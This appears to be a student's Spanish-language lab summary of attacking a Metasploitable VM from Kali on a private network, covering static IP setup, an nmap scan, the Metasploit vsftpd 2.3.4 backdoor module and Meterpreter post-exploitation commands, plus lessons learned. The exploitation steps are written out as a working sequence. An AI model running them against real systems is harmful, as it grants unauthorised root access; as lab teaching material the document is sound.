Resumen en español
Comandos utilizados

Configuración de red

ip a                                                    # ver interfaces y sus IPs
sudo ip link set eth0 up                                # activar la interfaz
sudo ip addr add 192.168.100.10/24 dev eth0              # IP estática en Kali
sudo ifconfig eth0 192.168.100.20 netmask 255.255.255.0 up  # IP estática en Metasploitable (sintaxis antigua, equivalente)
ping -c 3 192.168.100.20                                 # comprobar conectividad

Reconocimiento

nmap -sV -sC -T5 192.168.100.20   # escaneo de versiones + scripts por defecto

Explotación (Metasploit)

use exploit/unix/ftp/vsftpd_234_backdoor
set rhosts 192.168.100.20
set lhost 192.168.100.10
set ForceExploit true     # solo cuando el puerto 6200 seguía marcado como en uso
run

Post-explotación (Meterpreter)

getuid      # usuario con el que corre la sesión
shell       # abrir una shell de Linux real dentro de la sesión
whoami
ip a
exit        # salir del shell / de la sesión
QuE hemos aprendido
Redes internas sin DHCP: las máquinas no reciben IP automáticamente; hay que asignarla a mano, y las dos deben estar en la misma subred para verse.
ip vs ifconfig: dos herramientas distintas para lo mismo; ip es la moderna, ifconfig la clásica (presente en sistemas antiguos como Metasploitable).
Lectura de un escaneo Nmap: identificar servicios, versiones y riesgos (backdoors conocidos, protocolos sin cifrar, software obsoleto).
RHOSTS vs LHOST: a quién atacas frente a quién recibe la conexión; Metasploit valida las opciones del payload aunque el exploit concreto no las use todas de la misma forma.
Estado de un exploit en el objetivo: un backdoor puede "gastarse" tras usarse una vez; hay que saber leer los mensajes de Metasploit para distinguir un fallo de configuración de un problema de estado del servicio, y reiniciar el servicio/VM para solucionarlo.
Meterpreter no es una shell de Linux: tiene sus propios comandos (getuid, shell, etc.); shell te da acceso a comandos reales del sistema operativo.
Privilegios heredados: el acceso directo a root no siempre requiere un exploit de escalada; a veces el servicio vulnerable ya corre como root.
